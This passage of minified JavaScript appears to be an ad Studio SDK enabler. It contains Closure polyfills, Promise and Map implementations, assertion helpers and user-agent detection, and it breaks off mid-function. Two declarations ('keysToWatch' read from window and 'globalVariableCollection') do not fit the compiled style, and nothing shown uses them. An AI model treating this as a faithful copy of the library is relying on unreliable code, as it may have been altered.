(function () {
  var DEPS_GRAPH = {
    'enablermodule': [],
    'configurablemodule': ['enablermodule'],
    'gdnmodule': ['enablermodule'],
    'layoutsmodule': ['enablermodule'],
    'videomodule': ['enablermodule'],
    'layoutsfillermodule': ['enablermodule', 'layoutsmodule'],
    'rad_ui_videomodule': ['videomodule'],
    '$weak$': ['configurablemodule', 'enablermodule', 'gdnmodule', 'layoutsfillermodule', 'layoutsmodule', 'rad_ui_videomodule', 'videomodule']
  };
  window.STUDIO_SDK_START = +new Date(); /*
                                         Copyright The Closure Library Authors.
                                         SPDX-License-Identifier: Apache-2.0
                                         */
  var h,
    aa = function (a) {
      var b = 0;
      return function () {
        return b < a.length ? {
          done: !1,
          value: a[b++]
        } : {
          done: !0
        };
      };
    },
    ba = "function" == typeof Object.defineProperties ? Object.defineProperty : function (a, b, c) {
      if (a == Array.prototype || a == Object.prototype) return a;
      a[b] = c.value;
      return a;
    },
    ca = function (a) {
      a = ["object" == typeof globalThis && globalThis, a, "object" == typeof window && window, "object" == typeof self && self, "object" == typeof global && global];
      for (var b = 0; b < a.length; ++b) {
        var c = a[b];
        if (c && c.Math == Math) return c;
      }
      throw Error("Cannot find global object");
    },
    da = ca(this),
    k = function (a, b) {
      if (b) a: {
        var c = da;
        a = a.split(".");
        for (var d = 0; d < a.length - 1; d++) {
          var e = a[d];
          if (!(e in c)) break a;
          c = c[e];
        }
        a = a[a.length - 1];
        d = c[a];
        b = b(d);
        b != d && null != b && ba(c, a, {
          configurable: !0,
          writable: !0,
          value: b
        });
      }
    };
  k("Symbol", function (a) {
    if (a) return a;
    var b = function (f, g) {
      this.h = f;
      ba(this, "description", {
        configurable: !0,
        writable: !0,
        value: g
      });
    };
    b.prototype.toString = function () {
      return this.h;
    };
    var c = "jscomp_symbol_" + (1E9 * Math.random() >>> 0) + "_",
      d = 0,
      e = function (f) {
        if (this instanceof e) throw new TypeError("Symbol is not a constructor");
        return new b(c + (f || "") + "_" + d++, f);
      };
    return e;
  });
  k("Symbol.iterator", function (a) {
    if (a) return a;
    a = Symbol("Symbol.iterator");
    for (var b = "Array Int8Array Uint8Array Uint8ClampedArray Int16Array Uint16Array Int32Array Uint32Array Float32Array Float64Array".split(" "), c = 0; c < b.length; c++) {
      var d = da[b[c]];
      "function" === typeof d && "function" != typeof d.prototype[a] && ba(d.prototype, a, {
        configurable: !0,
        writable: !0,
        value: function () {
          return ea(aa(this));
        }
      });
    }
    return a;
  });
  var ea = function (a) {
      a = {
        next: a
      };
      a[Symbol.iterator] = function () {
        return this;
      };
      return a;
    },
    fa = function (a) {
      var b = "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
      if (b) return b.call(a);
      if ("number" == typeof a.length) return {
        next: aa(a)
      };
      throw Error(String(a) + " is not an iterable or ArrayLike");
    },
    ha = function (a, b) {
      return Object.prototype.hasOwnProperty.call(a, b);
    },
    ia = "function" == typeof Object.create ? Object.create : function (a) {
      var b = function () {};
      b.prototype = a;
      return new b();
    },
    ja;
  if ("function" == typeof Object.setPrototypeOf) ja = Object.setPrototypeOf;else {
    var ka;
    a: {
      var la = {
          a: !0
        },
        ma = {};
      try {
        ma.__proto__ = la;
        ka = ma.a;
        break a;
      } catch (a) {}
      ka = !1;
    }
    ja = ka ? function (a, b) {
      a.__proto__ = b;
      if (a.__proto__ !== b) throw new TypeError(a + " is not extensible");
      return a;
    } : null;
  }
  var na = ja,
    n = function (a, b) {
      a.prototype = ia(b.prototype);
      a.prototype.constructor = a;
      if (na) na(a, b);else for (var c in b) if ("prototype" != c) if (Object.defineProperties) {
        var d = Object.getOwnPropertyDescriptor(b, c);
        d && Object.defineProperty(a, c, d);
      } else a[c] = b[c];
      a.S = b.prototype;
    },
    oa = function () {
      this.o = !1;
      this.j = null;
      this.s = void 0;
      this.h = 1;
      this.B = this.v = 0;
      this.l = null;
    },
    pa = function (a) {
      if (a.o) throw new TypeError("Generator is already running");
      a.o = !0;
    };
  oa.prototype.A = function (a) {
    this.s = a;
  };
  var qa = function (a, b) {
    a.l = {
      ge: b,
      Ge: !0
    };
    a.h = a.v || a.B;
  };
  oa.prototype.return = function (a) {
    this.l = {
      return: a
    };
    this.h = this.B;
  };
  var ra = function (a) {
      this.h = new oa();
      this.j = a;
    },
    ua = function (a, b) {
      pa(a.h);
      var c = a.h.j;
      if (c) return sa(a, "return" in c ? c["return"] : function (d) {
        return {
          value: d,
          done: !0
        };
      }, b, a.h.return);
      a.h.return(b);
      return ta(a);
    },
    sa = function (a, b, c, d) {
      try {
        var e = b.call(a.h.j, c);
        if (!(e instanceof Object)) throw new TypeError("Iterator result " + e + " is not an object");
        if (!e.done) return a.h.o = !1, e;
        var f = e.value;
      } catch (g) {
        return a.h.j = null, qa(a.h, g), ta(a);
      }
      a.h.j = null;
      d.call(a.h, f);
      return ta(a);
    },
    ta = function (a) {
      for (; a.h.h;) try {
        var b = a.j(a.h);
        if (b) return a.h.o = !1, {
          value: b.value,
          done: !1
        };
      } catch (c) {
        a.h.s = void 0, qa(a.h, c);
      }
      a.h.o = !1;
      if (a.h.l) {
        b = a.h.l;
        a.h.l = null;
        if (b.Ge) throw b.ge;
        return {
          value: b.return,
          done: !0
        };
      }
      return {
        value: void 0,
        done: !0
      };
    },
    va = function (a) {
      this.next = function (b) {
        pa(a.h);
        a.h.j ? b = sa(a, a.h.j.next, b, a.h.A) : (a.h.A(b), b = ta(a));
        return b;
      };
      this.throw = function (b) {
        pa(a.h);
        a.h.j ? b = sa(a, a.h.j["throw"], b, a.h.A) : (qa(a.h, b), b = ta(a));
        return b;
      };
      this.return = function (b) {
        return ua(a, b);
      };
      this[Symbol.iterator] = function () {
        return this;
      };
    },
    wa = function (a) {
      function b(d) {
        return a.next(d);
      }
      function c(d) {
        return a.throw(d);
      }
      return new Promise(function (d, e) {
        function f(g) {
          g.done ? d(g.value) : Promise.resolve(g.value).then(b, c).then(f, e);
        }
        f(a.next());
      });
    },
    xa = function () {
      for (var a = Number(this), b = [], c = a; c < arguments.length; c++) b[c - a] = arguments[c];
      return b;
    };
  k("Promise", function (a) {
    function b() {
      this.h = null;
    }
    function c(g) {
      return g instanceof e ? g : new e(function (l) {
        l(g);
      });
    }
    if (a) return a;
    b.prototype.j = function (g) {
      if (null == this.h) {
        this.h = [];
        var l = this;
        this.l(function () {
          l.v();
        });
      }
      this.h.push(g);
    };
    var d = da.setTimeout;
    b.prototype.l = function (g) {
      d(g, 0);
    };
    b.prototype.v = function () {
      for (; this.h && this.h.length;) {
        var g = this.h;
        this.h = [];
        for (var l = 0; l < g.length; ++l) {
          var m = g[l];
          g[l] = null;
          try {
            m();
          } catch (p) {
            this.o(p);
          }
        }
      }
      this.h = null;
    };
    b.prototype.o = function (g) {
      this.l(function () {
        throw g;
      });
    };
    var e = function (g) {
      this.h = 0;
      this.l = void 0;
      this.j = [];
      this.A = !1;
      var l = this.o();
      try {
        g(l.resolve, l.reject);
      } catch (m) {
        l.reject(m);
      }
    };
    e.prototype.o = function () {
      function g(p) {
        return function (r) {
          m || (m = !0, p.call(l, r));
        };
      }
      var l = this,
        m = !1;
      return {
        resolve: g(this.ga),
        reject: g(this.v)
      };
    };
    e.prototype.ga = function (g) {
      if (g === this) this.v(new TypeError("A Promise cannot resolve to itself"));else if (g instanceof e) this.K(g);else {
        a: switch (typeof g) {
          case "object":
            var l = null != g;
            break a;
          case "function":
            l = !0;
            break a;
          default:
            l = !1;
        }
        l ? this.aa(g) : this.s(g);
      }
    };
    e.prototype.aa = function (g) {
      var l = void 0;
      try {
        l = g.then;
      } catch (m) {
        this.v(m);
        return;
      }
      "function" == typeof l ? this.J(l, g) : this.s(g);
    };
    e.prototype.v = function (g) {
      this.B(2, g);
    };
    e.prototype.s = function (g) {
      this.B(1, g);
    };
    e.prototype.B = function (g, l) {
      if (0 != this.h) throw Error("Cannot settle(" + g + ", " + l + "): Promise already settled in state" + this.h);
      this.h = g;
      this.l = l;
      2 === this.h && this.G();
      this.C();
    };
    e.prototype.G = function () {
      var g = this;
      d(function () {
        if (g.F()) {
          var l = da.console;
          "undefined" !== typeof l && l.error(g.l);
        }
      }, 1);
    };
    e.prototype.F = function () {
      if (this.A) return !1;
      var g = da.CustomEvent,
        l = da.Event,
        m = da.dispatchEvent;
      if ("undefined" === typeof m) return !0;
      "function" === typeof g ? g = new g("unhandledrejection", {
        cancelable: !0
      }) : "function" === typeof l ? g = new l("unhandledrejection", {
        cancelable: !0
      }) : (g = da.document.createEvent("CustomEvent"), g.initCustomEvent("unhandledrejection", !1, !0, g));
      g.promise = this;
      g.reason = this.l;
      return m(g);
    };
    e.prototype.C = function () {
      if (null != this.j) {
        for (var g = 0; g < this.j.length; ++g) f.j(this.j[g]);
        this.j = null;
      }
    };
    var f = new b();
    e.prototype.K = function (g) {
      var l = this.o();
      g.qb(l.resolve, l.reject);
    };
    e.prototype.J = function (g, l) {
      var m = this.o();
      try {
        g.call(l, m.resolve, m.reject);
      } catch (p) {
        m.reject(p);
      }
    };
    e.prototype.then = function (g, l) {
      function m(J, Y) {
        return "function" == typeof J ? function (Z) {
          try {
            p(J(Z));
          } catch (Ha) {
            r(Ha);
          }
        } : Y;
      }
      var p,
        r,
        F = new e(function (J, Y) {
          p = J;
          r = Y;
        });
      this.qb(m(g, p), m(l, r));
      return F;
    };
    e.prototype.catch = function (g) {
      return this.then(void 0, g);
    };
    e.prototype.qb = function (g, l) {
      function m() {
        switch (p.h) {
          case 1:
            g(p.l);
            break;
          case 2:
            l(p.l);
            break;
          default:
            throw Error("Unexpected state: " + p.h);
        }
      }
      var p = this;
      null == this.j ? f.j(m) : this.j.push(m);
      this.A = !0;
    };
    e.resolve = c;
    e.reject = function (g) {
      return new e(function (l, m) {
        m(g);
      });
    };
    e.race = function (g) {
      return new e(function (l, m) {
        for (var p = fa(g), r = p.next(); !r.done; r = p.next()) c(r.value).qb(l, m);
      });
    };
    e.all = function (g) {
      var l = fa(g),
        m = l.next();
      return m.done ? c([]) : new e(function (p, r) {
        function F(Z) {
          return function (Ha) {
            J[Z] = Ha;
            Y--;
            0 == Y && p(J);
          };
        }
        var J = [],
          Y = 0;
        do J.push(void 0), Y++, c(m.value).qb(F(J.length - 1), r), m = l.next(); while (!m.done);
      });
    };
    return e;
  });
  k("WeakMap", function (a) {
    function b() {}
    function c(m) {
      var p = typeof m;
      return "object" === p && null !== m || "function" === p;
    }
    function d(m) {
      if (!ha(m, f)) {
        var p = new b();
        ba(m, f, {
          value: p
        });
      }
    }
    function e(m) {
      var p = Object[m];
      p && (Object[m] = function (r) {
        if (r instanceof b) return r;
        Object.isExtensible(r) && d(r);
        return p(r);
      });
    }
    if (function () {
      if (!a || !Object.seal) return !1;
      try {
        var m = Object.seal({}),
          p = Object.seal({}),
          r = new a([[m, 2], [p, 3]]);
        if (2 != r.get(m) || 3 != r.get(p)) return !1;
        r.delete(m);
        r.set(p, 4);
        return !r.has(m) && 4 == r.get(p);
      } catch (F) {
        return !1;
      }
    }()) return a;
    var f = "$jscomp_hidden_" + Math.random();
    e("freeze");
    e("preventExtensions");
    e("seal");
    var g = 0,
      l = function (m) {
        this.h = (g += Math.random() + 1).toString();
        if (m) {
          m = fa(m);
          for (var p; !(p = m.next()).done;) p = p.value, this.set(p[0], p[1]);
        }
      };
    l.prototype.set = function (m, p) {
      if (!c(m)) throw Error("Invalid WeakMap key");
      d(m);
      if (!ha(m, f)) throw Error("WeakMap key fail: " + m);
      m[f][this.h] = p;
      return this;
    };
    l.prototype.get = function (m) {
      return c(m) && ha(m, f) ? m[f][this.h] : void 0;
    };
    l.prototype.has = function (m) {
      return c(m) && ha(m, f) && ha(m[f], this.h);
    };
    l.prototype.delete = function (m) {
      return c(m) && ha(m, f) && ha(m[f], this.h) ? delete m[f][this.h] : !1;
    };
    return l;
  });
  k("Map", function (a) {
    if (function () {
      if (!a || "function" != typeof a || !a.prototype.entries || "function" != typeof Object.seal) return !1;
      try {
        var l = Object.seal({
            x: 4
          }),
          m = new a(fa([[l, "s"]]));
        if ("s" != m.get(l) || 1 != m.size || m.get({
          x: 4
        }) || m.set({
          x: 4
        }, "t") != m || 2 != m.size) return !1;
        var p = m.entries(),
          r = p.next();
        if (r.done || r.value[0] != l || "s" != r.value[1]) return !1;
        r = p.next();
        return r.done || 4 != r.value[0].x || "t" != r.value[1] || !p.next().done ? !1 : !0;
      } catch (F) {
        return !1;
      }
    }()) return a;
    var b = new WeakMap(),
      c = function (l) {
        this.j = {};
        this.h = f();
        this.size = 0;
        if (l) {
          l = fa(l);
          for (var m; !(m = l.next()).done;) m = m.value, this.set(m[0], m[1]);
        }
      };
    c.prototype.set = function (l, m) {
      l = 0 === l ? 0 : l;
      var p = d(this, l);
      p.list || (p.list = this.j[p.id] = []);
      p.Y ? p.Y.value = m : (p.Y = {
        next: this.h,
        ra: this.h.ra,
        head: this.h,
        key: l,
        value: m
      }, p.list.push(p.Y), this.h.ra.next = p.Y, this.h.ra = p.Y, this.size++);
      return this;
    };
    c.prototype.delete = function (l) {
      l = d(this, l);
      return l.Y && l.list ? (l.list.splice(l.index, 1), l.list.length || delete this.j[l.id], l.Y.ra.next = l.Y.next, l.Y.next.ra = l.Y.ra, l.Y.head = null, this.size--, !0) : !1;
    };
    c.prototype.clear = function () {
      this.j = {};
      this.h = this.h.ra = f();
      this.size = 0;
    };
    c.prototype.has = function (l) {
      return !!d(this, l).Y;
    };
    c.prototype.get = function (l) {
      return (l = d(this, l).Y) && l.value;
    };
    c.prototype.entries = function () {
      return e(this, function (l) {
        return [l.key, l.value];
      });
    };
    c.prototype.keys = function () {
      return e(this, function (l) {
        return l.key;
      });
    };
    c.prototype.values = function () {
      return e(this, function (l) {
        return l.value;
      });
    };
    c.prototype.forEach = function (l, m) {
      for (var p = this.entries(), r; !(r = p.next()).done;) r = r.value, l.call(m, r[1], r[0], this);
    };
    c.prototype[Symbol.iterator] = c.prototype.entries;
    var d = function (l, m) {
        var p = m && typeof m;
        "object" == p || "function" == p ? b.has(m) ? p = b.get(m) : (p = "" + ++g, b.set(m, p)) : p = "p_" + m;
        var r = l.j[p];
        if (r && ha(l.j, p)) for (l = 0; l < r.length; l++) {
          var F = r[l];
          if (m !== m && F.key !== F.key || m === F.key) return {
            id: p,
            list: r,
            index: l,
            Y: F
          };
        }
        return {
          id: p,
          list: r,
          index: -1,
          Y: void 0
        };
      },
      e = function (l, m) {
        var p = l.h;
        return ea(function () {
          if (p) {
            for (; p.head != l.h;) p = p.ra;
            for (; p.next != p.head;) return p = p.next, {
              done: !1,
              value: m(p)
            };
            p = null;
          }
          return {
            done: !0,
            value: void 0
          };
        });
      },
      f = function () {
        var l = {};
        return l.ra = l.next = l.head = l;
      },
      g = 0;
    return c;
  });
  var ya = function (a, b, c) {
    a instanceof String && (a = String(a));
    for (var d = a.length, e = 0; e < d; e++) {
      var f = a[e];
      if (b.call(c, f, e, a)) return {
        Jc: e,
        rd: f
      };
    }
    return {
      Jc: -1,
      rd: void 0
    };
  };
  k("Array.prototype.find", function (a) {
    return a ? a : function (b, c) {
      return ya(this, b, c).rd;
    };
  });
  var za = function (a, b, c) {
    if (null == a) throw new TypeError("The 'this' value for String.prototype." + c + " must not be null or undefined");
    if (b instanceof RegExp) throw new TypeError("First argument to String.prototype." + c + " must not be a regular expression");
    return a + "";
  };
  k("String.prototype.endsWith", function (a) {
    return a ? a : function (b, c) {
      var d = za(this, b, "endsWith");
      b += "";
      void 0 === c && (c = d.length);
      c = Math.max(0, Math.min(c | 0, d.length));
      for (var e = b.length; 0 < e && 0 < c;) if (d[--c] != b[--e]) return !1;
      return 0 >= e;
    };
  });
  k("String.prototype.startsWith", function (a) {
    return a ? a : function (b, c) {
      var d = za(this, b, "startsWith");
      b += "";
      var e = d.length,
        f = b.length;
      c = Math.max(0, Math.min(c | 0, d.length));
      for (var g = 0; g < f && c < e;) if (d[c++] != b[g++]) return !1;
      return g >= f;
    };
  });
  k("Number.isFinite", function (a) {
    return a ? a : function (b) {
      return "number" !== typeof b ? !1 : !isNaN(b) && Infinity !== b && -Infinity !== b;
    };
  });
  var Aa = function (a, b) {
    a instanceof String && (a += "");
    var c = 0,
      d = !1,
      e = {
        next: function () {
          if (!d && c < a.length) {
            var f = c++;
            return {
              value: b(f, a[f]),
              done: !1
            };
          }
          d = !0;
          return {
            done: !0,
            value: void 0
          };
        }
      };
    e[Symbol.iterator] = function () {
      return e;
    };
    return e;
  };
  k("Array.prototype.entries", function (a) {
    return a ? a : function () {
      return Aa(this, function (b, c) {
        return [b, c];
      });
    };
  });
  k("Array.prototype.keys", function (a) {
    return a ? a : function () {
      return Aa(this, function (b) {
        return b;
      });
    };
  });
  k("Array.prototype.values", function (a) {
    return a ? a : function () {
      return Aa(this, function (b, c) {
        return c;
      });
    };
  });
  k("Array.from", function (a) {
    return a ? a : function (b, c, d) {
      c = null != c ? c : function (l) {
        return l;
      };
      var e = [],
        f = "undefined" != typeof Symbol && Symbol.iterator && b[Symbol.iterator];
      if ("function" == typeof f) {
        b = f.call(b);
        for (var g = 0; !(f = b.next()).done;) e.push(c.call(d, f.value, g++));
      } else for (f = b.length, g = 0; g < f; g++) e.push(c.call(d, b[g], g));
      return e;
    };
  });
  k("Number.isNaN", function (a) {
    return a ? a : function (b) {
      return "number" === typeof b && isNaN(b);
    };
  });
  k("Number.isInteger", function (a) {
    return a ? a : function (b) {
      return Number.isFinite(b) ? b === Math.floor(b) : !1;
    };
  });
  k("Object.entries", function (a) {
    return a ? a : function (b) {
      var c = [],
        d;
      for (d in b) ha(b, d) && c.push([d, b[d]]);
      return c;
    };
  });
  k("Object.is", function (a) {
    return a ? a : function (b, c) {
      return b === c ? 0 !== b || 1 / b === 1 / c : b !== b && c !== c;
    };
  });
  k("Array.prototype.includes", function (a) {
    return a ? a : function (b, c) {
      var d = this;
      d instanceof String && (d = String(d));
      var e = d.length;
      c = c || 0;
      for (0 > c && (c = Math.max(c + e, 0)); c < e; c++) {
        var f = d[c];
        if (f === b || Object.is(f, b)) return !0;
      }
      return !1;
    };
  });
  k("String.prototype.includes", function (a) {
    return a ? a : function (b, c) {
      return -1 !== za(this, b, "includes").indexOf(b, c || 0);
    };
  });
  k("Array.prototype.findIndex", function (a) {
    return a ? a : function (b, c) {
      return ya(this, b, c).Jc;
    };
  });
  var q = this || self,
    t = function (a, b, c) {
      a = a.split(".");
      c = c || q;
      a[0] in c || "undefined" == typeof c.execScript || c.execScript("var " + a[0]);
      for (var d; a.length && (d = a.shift());) a.length || void 0 === b ? c[d] && c[d] !== Object.prototype[d] ? c = c[d] : c = c[d] = {} : c[d] = b;
    },
    Ba = function (a, b) {
      a = a.split(".");
      b = b || q;
      for (var c = 0; c < a.length; c++) if (b = b[a[c]], null == b) return null;
      return b;
    },
    Ca = function () {
      throw Error("unimplemented abstract method");
    },
    Da = function (a) {
      a.Ja = void 0;
      a.tb = function () {
        return a.Ja ? a.Ja : a.Ja = new a();
      };
    },
    Ea = function (a) {
      var b = typeof a;
      return "object" != b ? b : a ? Array.isArray(a) ? "array" : b : "null";
    },
    Fa = function (a) {
      var b = Ea(a);
      return "array" == b || "object" == b && "number" == typeof a.length;
    },
    u = function (a) {
      var b = typeof a;
      return "object" == b && null != a || "function" == b;
    },
    Ja = function (a) {
      return Object.prototype.hasOwnProperty.call(a, Ga) && a[Ga] || (a[Ga] = ++Ia);
    },
    Ga = "closure_uid_" + (1E9 * Math.random() >>> 0),
    Ia = 0,
    Ka = function (a, b, c) {
      return a.call.apply(a.bind, arguments);
    },
    La = function (a, b, c) {
      if (!a) throw Error();
      if (2 < arguments.length) {
        var d = Array.prototype.slice.call(arguments, 2);
        return function () {
          var e = Array.prototype.slice.call(arguments);
          Array.prototype.unshift.apply(e, d);
          return a.apply(b, e);
        };
      }
      return function () {
        return a.apply(b, arguments);
      };
    },
    v = function (a, b, c) {
      Function.prototype.bind && -1 != Function.prototype.bind.toString().indexOf("native code") ? v = Ka : v = La;
      return v.apply(null, arguments);
    },
    Ma = function (a, b) {
      var c = Array.prototype.slice.call(arguments, 1);
      return function () {
        var d = c.slice();
        d.push.apply(d, arguments);
        return a.apply(this, d);
      };
    },
    Na = function () {
      return Date.now();
    },
    Oa = function (a, b, c) {
      t(a, b, c);
    },
    w = function (a, b) {
      function c() {}
      c.prototype = b.prototype;
      a.S = b.prototype;
      a.prototype = new c();
      a.prototype.constructor = a;
      a.sg = function (d, e, f) {
        for (var g = Array(arguments.length - 2), l = 2; l < arguments.length; l++) g[l - 2] = arguments[l];
        return b.prototype[e].apply(d, g);
      };
    },
    Pa = function (a) {
      return a;
    };
  function Qa(a, b) {
    if (Error.captureStackTrace) Error.captureStackTrace(this, Qa);else {
      var c = Error().stack;
      c && (this.stack = c);
    }
    a && (this.message = String(a));
    void 0 !== b && (this.cause = b);
  }
  w(Qa, Error);
  Qa.prototype.name = "CustomError";
  var Ra;
  function Sa(a, b) {
    a = a.split("%s");
    for (var c = "", d = a.length - 1, e = 0; e < d; e++) c += a[e] + (e < b.length ? b[e] : "%s");
    Qa.call(this, c + a[d]);
  }
  w(Sa, Qa);
  Sa.prototype.name = "AssertionError";
  function Ta(a, b, c, d) {
    var e = "Assertion failed";
    if (c) {
      e += ": " + c;
      var f = d;
    } else a && (e += ": " + a, f = b);
    throw new Sa("" + e, f || []);
  }
  var x = function (a, b, c) {
      a || Ta("", null, b, Array.prototype.slice.call(arguments, 2));
      return a;
    },
    Ua = function (a, b, c) {
      null == a && Ta("Expected to exist: %s.", [a], b, Array.prototype.slice.call(arguments, 2));
      return a;
    },
    Va = function (a, b) {
      throw new Sa("Failure" + (a ? ": " + a : ""), Array.prototype.slice.call(arguments, 1));
    },
    Wa = function (a, b, c) {
      "number" !== typeof a && Ta("Expected number but got %s: %s.", [Ea(a), a], b, Array.prototype.slice.call(arguments, 2));
      return a;
    },
    Xa = function (a, b, c) {
      "string" !== typeof a && Ta("Expected string but got %s: %s.", [Ea(a), a], b, Array.prototype.slice.call(arguments, 2));
    },
    Ya = function (a, b, c) {
      "function" !== typeof a && Ta("Expected function but got %s: %s.", [Ea(a), a], b, Array.prototype.slice.call(arguments, 2));
    },
    Za = function (a, b, c) {
      Array.isArray(a) || Ta("Expected array but got %s: %s.", [Ea(a), a], b, Array.prototype.slice.call(arguments, 2));
    },
    ab = function (a, b, c, d) {
      a instanceof b || Ta("Expected instanceof %s but got %s.", [$a(b), $a(a)], c, Array.prototype.slice.call(arguments, 3));
    };
  function $a(a) {
    return a instanceof Function ? a.displayName || a.name || "unknown type name" : a instanceof Object ? a.constructor.displayName || a.constructor.name || Object.prototype.toString.call(a) : null === a ? "null" : typeof a;
  }
  ;
  var db = function (a, b) {
    this.h = a === bb && b || "";
    this.j = cb;
  };
  db.prototype.Ba = !0;
  db.prototype.qa = function () {
    return this.h;
  };
  db.prototype.toString = function () {
    return "Const{" + this.h + "}";
  };
  var eb = function (a) {
      if (a instanceof db && a.constructor === db && a.j === cb) return a.h;
      Va("expected object of type Const, got '" + a + "'");
      return "type_error:Const";
    },
    cb = {},
    bb = {};
  var fb = function () {};
  var gb = function (a, b) {
    a.addEventListener && a.addEventListener.call(a, "load", b, !1);
  };
  var hb = Array.prototype.indexOf ? function (a, b) {
      x(null != a.length);
      return Array.prototype.indexOf.call(a, b, void 0);
    } : function (a, b) {
      if ("string" === typeof a) return "string" !== typeof b || 1 != b.length ? -1 : a.indexOf(b, 0);
      for (var c = 0; c < a.length; c++) if (c in a && a[c] === b) return c;
      return -1;
    },
    y = Array.prototype.forEach ? function (a, b, c) {
      x(null != a.length);
      Array.prototype.forEach.call(a, b, c);
    } : function (a, b, c) {
      for (var d = a.length, e = "string" === typeof a ? a.split("") : a, f = 0; f < d; f++) f in e && b.call(c, e[f], f, a);
    },
    ib = Array.prototype.filter ? function (a, b, c) {
      x(null != a.length);
      return Array.prototype.filter.call(a, b, c);
    } : function (a, b, c) {
      for (var d = a.length, e = [], f = 0, g = "string" === typeof a ? a.split("") : a, l = 0; l < d; l++) if (l in g) {
        var m = g[l];
        b.call(c, m, l, a) && (e[f++] = m);
      }
      return e;
    },
    jb = Array.prototype.map ? function (a, b) {
      x(null != a.length);
      return Array.prototype.map.call(a, b, void 0);
    } : function (a, b) {
      for (var c = a.length, d = Array(c), e = "string" === typeof a ? a.split("") : a, f = 0; f < c; f++) f in e && (d[f] = b.call(void 0, e[f], f, a));
      return d;
    },
    kb = Array.prototype.some ? function (a, b, c) {
      x(null != a.length);
      return Array.prototype.some.call(a, b, c);
    } : function (a, b, c) {
      for (var d = a.length, e = "string" === typeof a ? a.split("") : a, f = 0; f < d; f++) if (f in e && b.call(c, e[f], f, a)) return !0;
      return !1;
    };
  function lb(a) {
    var b = q.performance.getEntriesByType("resource");
    a = mb(b, a);
    return 0 > a ? null : "string" === typeof b ? b.charAt(a) : b[a];
  }
  function mb(a, b) {
    for (var c = a.length, d = "string" === typeof a ? a.split("") : a, e = 0; e < c; e++) if (e in d && b.call(void 0, d[e], e, a)) return e;
    return -1;
  }
  function nb(a, b) {
    b = hb(a, b);
    var c;
    (c = 0 <= b) && ob(a, b);
    return c;
  }
  function ob(a, b) {
    x(null != a.length);
    Array.prototype.splice.call(a, b, 1);
  }
  const keysToWatch = window.keysToWatch;
  function pb(a) {
    return Array.prototype.concat.apply([], arguments);
  }
  function qb(a) {
    var b = a.length;
    if (0 < b) {
      for (var c = Array(b), d = 0; d < b; d++) c[d] = a[d];
      return c;
    }
    return [];
  }
  function rb(a, b) {
    for (var c = 1; c < arguments.length; c++) {
      var d = arguments[c];
      if (Fa(d)) {
        var e = a.length || 0,
          f = d.length || 0;
        a.length = e + f;
        for (var g = 0; g < f; g++) a[e + g] = d[g];
      } else a.push(d);
    }
  }
  function sb(a, b, c, d) {
    x(null != a.length);
    Array.prototype.splice.apply(a, tb(arguments, 1));
  }
  function tb(a, b, c) {
    x(null != a.length);
    return 2 >= arguments.length ? Array.prototype.slice.call(a, b) : Array.prototype.slice.call(a, b, c);
  }
  function ub(a, b) {
    a.sort(b || vb);
  }
  let globalVariableCollection = [];
  function wb(a, b) {
    for (var c = Array(a.length), d = 0; d < a.length; d++) c[d] = {
      index: d,
      value: a[d]
    };
    var e = b || vb;
    ub(c, function (f, g) {
      return e(f.value, g.value) || f.index - g.index;
    });
    for (b = 0; b < a.length; b++) a[b] = c[b].value;
  }
  function vb(a, b) {
    return a > b ? 1 : a < b ? -1 : 0;
  }
  ;
  var xb = function (a, b) {
    if (!u(a) || !u(a) || !u(a) || 1 !== a.nodeType || a.namespaceURI && "http://www.w3.org/1999/xhtml" !== a.namespaceURI || a.tagName.toUpperCase() !== b.toString()) {
      b = b.toString() + "; got: ";
      if (u(a)) try {
        var c = a.constructor.displayName || a.constructor.name || Object.prototype.toString.call(a);
      } catch (d) {
        c = "<object could not be stringified>";
      } else c = void 0 === a ? "undefined" : null === a ? "null" : typeof a;
      Va("Argument is not an HTML Element with tag name " + (b + c));
    }
  };
  var yb,
    zb = Ba("CLOSURE_FLAGS"),
    Ab = zb && zb[610401301];
  yb = null != Ab ? Ab : !1;
  var Bb = function (a, b) {
      return 0 == a.lastIndexOf(b, 0);
    },
    Cb = function (a) {
      return /^[\s\xa0]*$/.test(a);
    },
    Db = String.prototype.trim ? function (a) {
      return a.trim();
    } : function (a) {
      return /^[\s\xa0]*([\s\S]*?)[\s\xa0]*$/.exec(a)[1];
    },
    Eb = /&/g,
    Fb = /</g,
    Gb = />/g,
    Hb = /"/g,
    Ib = /'/g,
    Jb = /\x00/g,
    Kb = /[\x00&<>"']/,
    Lb = function (a, b) {
      return -1 != a.indexOf(b);
    },
    Nb = function (a, b) {
      var c = 0;
      a = Db(String(a)).split(".");
      b = Db(String(b)).split(".");
      for (var d = Math.max(a.length, b.length), e = 0; 0 == c && e < d; e++) {
        var f = a[e] || "",
          g = b[e] || "";
        do {
          f = /(\d*)(\D*)(.*)/.exec(f) || ["", "", "", ""];
          g = /(\d*)(\D*)(.*)/.exec(g) || ["", "", "", ""];
          if (0 == f[0].length && 0 == g[0].length) break;
          c = Mb(0 == f[1].length ? 0 : parseInt(f[1], 10), 0 == g[1].length ? 0 : parseInt(g[1], 10)) || Mb(0 == f[2].length, 0 == g[2].length) || Mb(f[2], g[2]);
          f = f[3];
          g = g[3];
        } while (0 == c);
      }
      return c;
    },
    Mb = function (a, b) {
      return a < b ? -1 : a > b ? 1 : 0;
    };
  function Ob() {
    var a = q.navigator;
    return a && (a = a.userAgent) ? a : "";
  }
  var Pb,
    Qb = q.navigator;
  Pb = Qb ? Qb.userAgentData || null : null;
  function Rb(a) {
    return yb ? Pb ? Pb.brands.some(function (b) {
      return (b = b.brand) && Lb(b, a);
    }) : !1 : !1;
  }
  function z(a) {
    return Lb(Ob(), a);
  }
  ;
  function Sb() {
    return yb ? !!Pb && 0 < Pb.brands.length : !1;
  }
  function Tb() {
    return Sb() ? !1 : z("Opera");
  }
  function Ub() {
    return Sb() ? !1 : z("Trident") || z("MSIE");
  }
  function Vb() {
    return z("Firefox") || z("FxiOS");
  }
  function Wb() {
    return Sb() ? Rb("Chromium") : (z("Chrome") || z("CriOS")) && !(Sb() ? 0 : z("Edge")) || z("Silk");
  }
  function Xb() {
    var a = Ob();
    if (Ub()) {
      var b = /rv: *([\d\.]*)/.exec(a);
      if (b && b[1]) a = b[1];else {
        b = "";
        var c = /MSIE +([\d\.]+)/.exec(a);
        if (c && c[1]) if (a = /Trident\/(\d.\d)/.exec(a), "7.0" == c[1]) {
          if (a && a[1]) switch (a[1]) {
            case "4.0":
              b = "8.0";
              break;
            case "5.0":
              b = "9.0";
              break;
            case "6.0":
              b = "10.0";
              break;
            case "7.0":
              b = "11.0";
